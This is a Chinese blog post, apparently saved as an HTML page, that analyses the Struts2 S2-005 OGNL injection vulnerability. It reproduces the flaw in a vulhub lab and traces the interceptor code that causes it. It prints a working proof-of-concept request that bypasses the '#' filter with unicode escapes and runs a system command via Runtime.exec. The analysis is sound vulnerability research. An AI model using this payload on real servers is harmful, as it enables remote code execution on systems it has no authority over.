@@ -1,0 +1,445 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Struts2 历史漏洞分析 — S2-005 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="本篇文章全文约 10556 个字符，5 张图片，预计阅读时间为 15 分钟，请合理安排阅读时间。关于 S2-005首先贴上官方对 S2-005 的通报https://struts.apache...." />
+<meta name="keywords" content="Struts2漏洞分析,s2-005" />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Struts2 历史漏洞分析 — S2-005 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/107.html" />
+<link rel="alternate" type="application/rdf+xml" title="Struts2 历史漏洞分析 — S2-005 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/107.html" />
+<link rel="alternate" type="application/atom+xml" title="Struts2 历史漏洞分析 — S2-005 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/107.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-107'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-107'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-107'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _XSZzjTj = '30'//'z0'
++//'J'
+'b00'+'0a'//'6Qe'
++//'F1'
+'d'+//'0'
+'78'+//'p'
+'40'+/* 'Y'//'Y' */''+/* 'M9'//'M9' */''+//'d'
+'d47'+'9e1'//'i'
++'44'//'bs'
++/* 'c'//'c' */''+'e'//'kt'
++//'Lhx'
+'1d'+//'Hb'
+'76a'+'d'//'UIe'
++'R'//'R'
++//'a9'
+'f21'+//'h'
+'a'+'2'//'Kap'
+, _YI34px = [[27,28]];
+    
+    for (var i = 0; i < _YI34px.length; i ++) {
+        _XSZzjTj = _XSZzjTj.substring(0, _YI34px[i][0]) + _XSZzjTj.substring(_YI34px[i][1]);
+    }
+
+    return _XSZzjTj;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Struts2 历史漏洞分析 — S2-005</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-03-07 13:27:00" itemprop="datePublished">2019-03-07 13:27:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/107.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/107.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <blockquote><p>本篇文章全文约 10556 个字符，5 张图片，预计阅读时间为 15 分钟，请合理安排阅读时间。</p></blockquote><h2>关于 S2-005</h2><p>首先贴上官方对 S2-005 的通报<br><a href="https://struts.apache.org/docs/s2-005.html" target="_blank">https://struts.apache.org/docs/s2-005.html</a><br>以及一篇老外的文章<br><a href="http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html" target="_blank">http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html</a></p><p>影响范围：Struts 2.0.0 - Struts 2.1.8.1</p><p>《白帽子讲WEB安全》一书中有提到：</p><blockquote><p>S2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(u0023)或8进制(43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。 —— 《白帽子讲Web安全》</p></blockquote><p>也就是说，S2-005这个漏洞的成因是由于在 S2-003 这个漏洞中没有完全修补造成的。</p><p>而 S2-003 是因为在 <code>ParametersInterceptor</code> 拦截器中过滤了 <code>#</code>以保护成员的安全，但可以通过 Unicode 编码来绕过。</p><p>例如：想要把 #session.user设置为 '0wn3d'<br>应转换为<br>('u0023' + 'session'user'')(unused)=0wn3d</p><p>官方对S2-003的修复方案是：增加安全配置禁止静态方法调用（allowStaticMethodAcces）和类方法执行（MethodAccessor.den<br>yMethodExecution）等来修补。</p><h2>复现</h2><p>参考 vulhub 中提供的例子，启动docker。</p><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-005" target="_blank">https://github.com/vulhub/vulhub/tree/master/struts2/s2-005</a></p><p>payload</p><pre><code>http://localhost:8888/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((%27%5cu0023rt.exec(%22calc%22.split(%<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="25171765">[email&#160;protected]</a>%22))%27)(%5cu0023rt%<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5065332560606334103a3126317e3c313e377e02253e24393d35">[email&#160;protected]</a>@getRuntime()))=1</code></pre><p><img src="/usr/uploads/2019/03/357193477.jpg" alt="1551936224(1).jpg" title="1551936224(1).jpg"></p><p>成功执行系统命令</p><h2>分析</h2><p>前面说了，是因为struts参数拦截器把每个参数进行了一次OGNL计算来获取对象导致的。那我就来带上参数访问看看会hook到什么。</p><p><a href="http://localhost" target="_blank">http://localhost</a>:8888/example/HelloWorld.action?aaaaaa=123456</p><pre><code>---------------------------------EXP-----------------------------------------
+aaaaaa
+---------------------------------璋冪敤閾 ---------------------------------------
+java.lang.Thread.getStackTrace(Thread.java:1559)
+org.javaweb.expression.Agent.expression(Agent.java:179)
+ognl.Ognl.parseExpression(Ognl.java)
+com.opensymphony.xwork2.ognl.OgnlUtil.compile(OgnlUtil.java:214)
+com.opensymphony.xwork2.ognl.OgnlUtil.setValue(OgnlUtil.java:198)
+com.opensymphony.xwork2.ognl.OgnlValueStack.setValue(OgnlValueStack.java:161)
+com.opensymphony.xwork2.ognl.OgnlValueStack.setValue(OgnlValueStack.java:149)
+com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters(ParametersInterceptor.java:276)
+com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept(ParametersInterceptor.java:187)
+com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:87)
+//...
+com.opensymphony.xwork2.interceptor.ExceptionMappingInterceptor.intercept(ExceptionMappingInterceptor.java:176)
+com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:237)
+org.apache.struts2.impl.StrutsActionProxy.execute(StrutsActionProxy.java:52)
+org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:488)
+org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction(ExecuteOperations.java:77)
+org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:91)
+//...
+java.lang.Thread.run(Thread.java:748)</code></pre><p>aaaaaa 就是 hook 到的 ognl 表达式。</p><p>接下来开始一点点分析成因。</p><p>既然前面提到了是因为拦截器的原因，那就先来看看拦截器是以怎样的形式存在于 Struts2 里的。</p><p>打开 war 包找到 struts.xml</p><pre><code>    &lt;package name=&quot;default&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;
+        &lt;default-action-ref name=&quot;index&quot; /&gt;
+        &lt;action name=&quot;index&quot;&gt;
+            &lt;result type=&quot;redirectAction&quot;&gt;
+                &lt;param name=&quot;actionName&quot;&gt;HelloWorld&lt;/param&gt;
+                &lt;param name=&quot;namespace&quot;&gt;/example&lt;/param&gt;
+            &lt;/result&gt;
+        &lt;/action&gt;
+    &lt;/package&gt;</code></pre><p>这是我所访问的 action 对应的 package标签。</p><p>其中有一句<code>extends=&quot;struts-default&quot;</code> 就是去继承 struts 默认的父package。</p><p>在 <code>struts2-core-2.1.8.1.jar!\struts-default.xml</code> 中可以找到。</p><p>里面代码很多，我只提取部分出来说明。</p><pre><code>&lt;interceptor name=&quot;params&quot; class=&quot;com.opensymphony.xwork2.interceptor.ParametersInterceptor&quot;/&gt;</code></pre><p>这里他声明了一个名为 params 的拦截器，指向的是 ParametersInterceptor 类。</p><pre><code>&lt;interceptor-stack name=&quot;defaultStack&quot;&gt;
+                &lt;!-- 省略 --&gt;
+                &lt;interceptor-ref name=&quot;params&quot;&gt;
+                  &lt;param name=&quot;excludeParams&quot;&gt;dojo\..*,^struts\..*&lt;/param&gt;
+                &lt;/interceptor-ref&gt;
+                &lt;interceptor-ref name=&quot;conversionError&quot;/&gt;
+                &lt;interceptor-ref name=&quot;validation&quot;&gt;
+                    &lt;param name=&quot;excludeMethods&quot;&gt;input,back,cancel,browse&lt;/param&gt;
+                &lt;/interceptor-ref&gt;
+                &lt;interceptor-ref name=&quot;workflow&quot;&gt;
+                    &lt;param name=&quot;excludeMethods&quot;&gt;input,back,cancel,browse&lt;/param&gt;
+                &lt;/interceptor-ref&gt;
+            &lt;/interceptor-stack&gt;</code></pre><p>这是一个名为"defaultStack"的拦截器栈 其中引用了 params 拦截器。</p><p><code>dojo\..*,^struts\..*</code>是它的参数</p><pre><code>
+        &lt;default-interceptor-ref name=&quot;defaultStack&quot;/&gt;
+
+        &lt;default-class-ref class=&quot;com.opensymphony.xwork2.ActionSupport&quot; /&gt;</code></pre><p>最后，把defaultStack作为了默认的拦截器栈。</p><p>重新请求一遍，Debug 一步步分析。</p><p>从 struts2 的核心控制器到 intercept 执行前都是废话</p><pre><code>(StrutsPrepareAndExecuteFilter.java:91)
+(ExecuteOperations.java:77)
+(Dispatcher.java:488)
+(StrutsActionProxy.java:52)
+(DefaultActionInvocation.java:237)</code></pre><p>然后它会在 <code>DefaultActionInvocation (com.opensymphony.xwork2)</code>的<code>invoke</code>方法中去调用拦截器栈中的所有拦截器。</p><p>跳过前面没用的代码，最终到达 <code>ParametersInterceptor</code>拦截器的处理部分。</p><p><img src="/usr/uploads/2019/03/2065390234.jpg" alt="1551936237(1).jpg" title="1551936237(1).jpg"></p><p><code>this.resultCode = interceptor.getInterceptor().intercept(this);</code></p><p>这段代码就是去执行拦截器</p><p>然后经过MethodFilterInterceptor类的intercept方法到达</p><p>ParametersInterceptor类的doIntercept方法</p><pre><code>public String doIntercept(ActionInvocation invocation) throws Exception {
+        Object action = invocation.getAction();
+        if (!(action instanceof NoParameters)) {
+            ActionContext ac = invocation.getInvocationContext();
+            Map&lt;String, Object&gt; parameters = this.retrieveParameters(ac);
+            if (LOG.isDebugEnabled()) {
+                LOG.debug(&quot;Setting params &quot; + this.getParameterLogMap(parameters), new String[0]);
+            }
+
+            if (parameters != null) {
+                Map contextMap = ac.getContextMap();
+
+                try {
+                    ReflectionContextState.setCreatingNullObjects(contextMap, true);
+                    ReflectionContextState.setDenyMethodExecution(contextMap, true);
+                    ReflectionContextState.setReportingConversionErrors(contextMap, true);
+                    ValueStack stack = ac.getValueStack();
+                    this.setParameters(action, stack, parameters);  // 装配参数，进入漏洞触发部分
+                } finally {
+                    ReflectionContextState.setCreatingNullObjects(contextMap, false);
+                    ReflectionContextState.setDenyMethodExecution(contextMap, false);
+                    ReflectionContextState.setReportingConversionErrors(contextMap, false);
+                }
+            }
+        }
+
+        return invocation.invoke();
+    }</code></pre><p>跟进<code>ParametersInterceptor.setParameters</code></p><pre><code>protected void setParameters(Object action, ValueStack stack, Map&lt;String, Object&gt; parameters) {
+        ParameterNameAware parameterNameAware = action instanceof ParameterNameAware ? (ParameterNameAware)action : null;
+        TreeMap params;
+        TreeMap acceptableParameters;
+        if (this.ordered) {
+            params = new TreeMap(this.getOrderedComparator());
+            acceptableParameters = new TreeMap(this.getOrderedComparator());
+            params.putAll(parameters);
+        } else {
+            params = new TreeMap(parameters);
+            acceptableParameters = new TreeMap();
+        }
+
+        Iterator i$ = params.entrySet().iterator(); // 迭代每个参数
+
+        while(i$.hasNext()) { 
+            Entry&lt;String, Object&gt; entry = (Entry)i$.next();
+            String name = (String)entry.getKey();
+            boolean acceptableName = this.acceptableName(name) &amp;&amp; (parameterNameAware == null || parameterNameAware.acceptableParameterName(name));
+            // 这一步验证输入的参数是否和规定的正则表达式匹配
+            
+            if (acceptableName) {
+                acceptableParameters.put(name, entry.getValue());
+            }
+        }
+
+        ValueStack newStack = this.valueStackFactory.createValueStack(stack);
+        boolean clearableStack = newStack instanceof ClearableValueStack;
+        if (clearableStack) {
+            ((ClearableValueStack)newStack).clearContextValues();
+            Map&lt;String, Object&gt; context = newStack.getContext();
+            ReflectionContextState.setCreatingNullObjects(context, true);
+            ReflectionContextState.setDenyMethodExecution(context, true);
+            ReflectionContextState.setReportingConversionErrors(context, true);
+            context.put(&quot;com.opensymphony.xwork2.ActionContext.locale&quot;, stack.getContext().get(&quot;com.opensymphony.xwork2.ActionContext.locale&quot;));
+        }
+
+        boolean memberAccessStack = newStack instanceof MemberAccessValueStack; //允许访问栈
+        if (memberAccessStack) {
+            MemberAccessValueStack accessValueStack = (MemberAccessValueStack)newStack;
+            accessValueStack.setAcceptProperties(this.acceptParams);
+            accessValueStack.setExcludeProperties(this.excludeParams);
+        }
+
+        Iterator i$ = acceptableParameters.entrySet().iterator(); // 迭代允许执行的参数
+
+        while(i$.hasNext()) {
+            Entry&lt;String, Object&gt; entry = (Entry)i$.next();
+            String name = (String)entry.getKey();  //触发漏洞的payload
+            Object value = entry.getValue();
+
+            try {
+                newStack.setValue(name, value);  // 触发漏洞部分
+            } catch (RuntimeException var16) {
+                if (devMode) {
+                    String developerNotification = LocalizedTextUtil.findText(ParametersInterceptor.class, &quot;devmode.notification&quot;, ActionContext.getContext().getLocale(), &quot;Developer Notification:\n{0}&quot;, new Object[]{&quot;Unexpected Exception caught setting '&quot; + name + &quot;' on '&quot; + action.getClass() + &quot;: &quot; + var16.getMessage()});
+                    LOG.error(developerNotification, new String[0]);
+                    if (action instanceof ValidationAware) {
+                        ((ValidationAware)action).addActionMessage(developerNotification);
+                    }
+                }
+            }
+        }
+
+        //省略...
+    }</code></pre><p><img src="/usr/uploads/2019/03/2246535672.jpg" alt="1551936252(1).jpg" title="1551936252(1).jpg"></p><p>这里验证参数是否符合表达式 <code>[[\p{Graph}\s]&amp;&amp;[^,#:=]]*</code> ，如果符合则被认为带有特殊字符不予通过。并且还要通过isExcluded方法的验证（<code>dojo\..*</code>和<code>^struts\..*</code>不能带有dojo和以struts开头的参数名）。</p><p><img src="/usr/uploads/2019/03/3322219422.jpg" alt="1551936259(1).jpg" title="1551936259(1).jpg"></p><p>最终在<code>OgnlValueStack.setValue</code>中执行了表达式。</p><h2>总结</h2><p>我们先来总结一下POC。</p><pre><code>('\u0023_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true
+&amp;(aaaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023vccc')(\u0023vccc\u003dnew java.lang.Boolean(&quot;false&quot;)))
+&amp;(asdf)(('\u0023rt.exec(&quot;calc&quot;)')(\u0023rt\<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="047134343760446e6572652a68656a632a56716a706d6961">[email&#160;protected]</a>@getRuntime()))=1</code></pre><p>解码后</p><pre><code>('#_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true
+//设置允许访问静态方法
+&amp;(aaaa)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=#vccc')(#vccc=new java.lang.Boolean(&quot;false&quot;)))
+//设置denyMethodExecution为false 允许ognl自定义变量
+&amp;(asdf)(('#rt.exec(&quot;calc&quot;)')(#<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="780a0c453812190e19561419161f562a0d160c11151d">[email&#160;protected]</a>@getRuntime()))=1
+//执行 calc 系统命令</code></pre><p>比起以往的的POC，可以看到这个POC非常有特点，我提取出来几个说一下。</p><ul><li><code>\u0023</code></li><li><code>(vaaa)</code></li><li><code>xxxx[\'xxx\']</code></li></ul><p>首先说<code>\u0023</code> ，这是一个Unicode编码，转换过来就是<code>#</code>。<br>这里为的是绕过前面的参数校验，拦截器中不允许键中存在<code>^,#:=</code>这些字符，而我们的Payload为了可以访问对象则必须要有<code>#和=</code>，所以我们要用 Unicode 或8进制代替，在OGNL执行的时候会取出Unicode进行解码，这就导致我们可以通过编码特殊字符来绕过Struts2的防御。</p><p>再来说<code>(vaaa)</code>，这里可以参考：<a href="http://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank">http://commons.apache.org/proper/commons-ognl/language-guide.html</a> 的 <strong>Expression Evaluation</strong> 部分</p><p><img src="/usr/uploads/2019/03/3467386608.jpg" alt="1551936267(1).jpg" title="1551936267(1).jpg"></p><blockquote><p>如果在ognl表达式后面使用带括号的表达式，而括号前面没有点，ognl将尝试将第一个表达式的结果视为要计算的另一个表达式，并将带括号表达式的结果用作该计算的根对象。第一个表达式的结果可以是任何对象；如果它是AST，则ognl假定它是表达式的解析形式并简单地解释它；否则，ognl将获取对象的字符串值并解析该字符串以获取要解释的AST。</p><p>因为ognl会将其解释为对fact方法的调用。通过用括号将属性引用括起来，可以强制执行所需的解释</p></blockquote><p>翻译成人话就是说括号里的表达式会被执行。</p><blockquote><p>（1）（expression）（constant）= value会执行expression=value。<br>（2）（constant）（（expression1）（expression2））会先执行expression2，然后再执行expression1。 参考：<a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank">Struts2漏洞分析与研究之S2-005漏洞分析</a></p></blockquote><p>再来说一下 <code>xxxx[\'xxx\']</code>  比如这个表达式<code>('\u0023_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true</code> 前面有说到过 <strong>Expression Evaluation</strong>  会执行 第一个括号中的<code>('\u0023_memberAccess[\'allowStaticMethodAccess\']')=true</code> </p><p><code>'#_memberAccess[\'allowStaticMethodAccess\']'</code>这个则是真正要执行的表达式。</p><p>因为修改 aaa 的 bbb 属性可以用 aaa.bbb=ccc 或 aaa['bbb']=ccc 表示，所以这里用了<br><code>#_memberAccess[\'allowStaticMethodAccess\']</code> 这种表达式，而使用反斜杠<code>\</code>是因为它已经在单引号表达式中存在了所以要转义。又因为在键中这种表示是不允许的所以在请求时一般需要进行一次url编码。</p><p><strong>最后总结一下这个漏洞。</strong></p><p>根据前面的介绍和分析已经可以知道漏洞的两个成因：</p><ul><li><code>ParametersInterceptor</code>只通过正则去简单的判断<code>#</code>，而OGNL是可以对 Unicode 字符解码执行的</li><li>可以修改<code>xwork.MethodAccessor.denyMethodExecution</code>和<code>allowStaticMethodAccess</code>以绕过 Struts 的防护</li></ul>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-107" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/107.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/107.html#respond-post-107" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
